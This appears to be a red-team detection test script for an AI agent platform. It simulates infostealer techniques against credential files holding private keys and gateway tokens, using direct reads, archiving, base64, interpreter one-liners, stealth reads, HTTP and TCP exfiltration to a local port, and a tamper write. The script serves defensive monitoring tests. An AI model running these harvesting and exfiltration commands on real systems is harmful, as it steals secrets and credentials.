#!/usr/bin/env bash
# Red Lobster v8 — Flag 17: INFOSTEALER DEFENSE
# Threat model: file-harvesting malware reads credential files without modifying them
# Ref: Security Affairs Feb 2025 — OpenClaw infostealer exfiltrating device.json, openclaw.json
# Target files: device.json (private keys), openclaw.json (gateway tokens), settings.json
# Detection layers: auditd read-watch, behavior (AGENT_SENSITIVE_PATHS), sentinel (writes only)
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag17" "Flag 17: INFOSTEALER DEFENSE — Credential file harvesting"

OC_DIR="/home/openclaw/.openclaw"
DEVICE="$OC_DIR/device.json"
CONFIG="$OC_DIR/openclaw.json"
SETTINGS="$OC_DIR/settings.json"
OUTDIR="$FLAG_DIR"

# ── 1. Direct reads of each target file ──────────────────────────────────────

rl_run "cat device.json" \
  "cat '$DEVICE' > '$OUTDIR/17_1.txt'"

rl_run "cat openclaw.json" \
  "cat '$CONFIG' > '$OUTDIR/17_2.txt'"

rl_run "cat settings.json" \
  "cat '$SETTINGS' > '$OUTDIR/17_3.txt'"

# ── 2. Copy/archive-based exfil ─────────────────────────────────────────────

rl_run "cp device.json" \
  "cp '$DEVICE' '$OUTDIR/17_cp.json'"

rl_run "base64 device.json (steganographic)" \
  "base64 '$DEVICE' > '$OUTDIR/17_b64.txt'"

rl_run "tar bulk archive (device+openclaw+settings)" \
  "tar czf '$OUTDIR/17_creds.tar.gz' '$DEVICE' '$CONFIG' '$SETTINGS' 2>/dev/null"

rl_run "dd if=device.json (unconventional read)" \
  "dd if='$DEVICE' of='$OUTDIR/17_dd.json' bs=4096 2>/dev/null"

# ── 3. Interpreter-based credential reads ───────────────────────────────────

rl_run "python3 read device.json" \
  "python3 -c \"open('$OUTDIR/17_py1.txt','w').write(open('$DEVICE').read())\""

rl_run "python3 read openclaw.json" \
  "python3 -c \"open('$OUTDIR/17_py2.txt','w').write(open('$CONFIG').read())\""

rl_run "node readFileSync device.json" \
  "node -e \"require('fs').writeFileSync('$OUTDIR/17_n1.txt', require('fs').readFileSync('$DEVICE'))\""

rl_run "node readFileSync openclaw.json" \
  "node -e \"require('fs').writeFileSync('$OUTDIR/17_n2.txt', require('fs').readFileSync('$CONFIG'))\""

# ── 4. Stealth reads (evasion techniques) ───────────────────────────────────

rl_run "script -c wrapper (device.json)" \
  "script -qc 'cat $DEVICE' '$OUTDIR/17_script.txt' 2>/dev/null"

rl_run "head -c 99999 device.json (partial read)" \
  "head -c 99999 '$DEVICE' > '$OUTDIR/17_head.txt'"

rl_run "less device.json (pager read)" \
  "less '$DEVICE' > '$OUTDIR/17_less.txt' 2>/dev/null"

# ── 5. Python network exfil of device.json ───────────────────────────────────

rl_run "python3 POST device.json to HTTP" \
  "python3 -c \"
import http.client
try:
    c = http.client.HTTPConnection('127.0.0.1', 19999, timeout=2)
    c.request('POST', '/exfil', open('$DEVICE','rb').read())
except: pass
\""

rl_run "python3 TCP exfil device.json" \
  "python3 -c \"
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect(('127.0.0.1', 19999))
    s.sendall(open('$DEVICE','rb').read())
except: pass
finally: s.close()
\""

# ── 6. Bulk harvest (simulates real infostealer pattern) ─────────────────────

rl_run "python3 bulk harvest (4 credential files)" \
  "python3 -c \"
import json, os
harvest = {}
targets = [
    '$DEVICE',
    '$CONFIG',
    '/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json',
    '/home/openclaw/.openclaw/gateway.yaml',
]
for f in targets:
    try:
        harvest[os.path.basename(f)] = open(f).read()
    except: pass
open('$OUTDIR/17_harvest.json','w').write(json.dumps(harvest))
\""

rl_run "node bulk harvest (3 credential files)" \
  "node -e \"
const fs=require('fs'), path=require('path');
const targets = ['$DEVICE','$CONFIG','$SETTINGS'];
const harvest = {};
targets.forEach(f => { try { harvest[path.basename(f)] = fs.readFileSync(f,'utf8'); } catch(e) {} });
fs.writeFileSync('$OUTDIR/17_harvest_n.json', JSON.stringify(harvest));
\""

# ── 7. File modification (sentinel Protected policy test) ────────────────────

# Flush: wait for any lingering alerts from previous tests to settle
sleep 5

rl_run "echo >> device.json (sentinel tamper test)" \
  "echo '// tampered' >> '$DEVICE'"

rl_summary
rl_cleanup
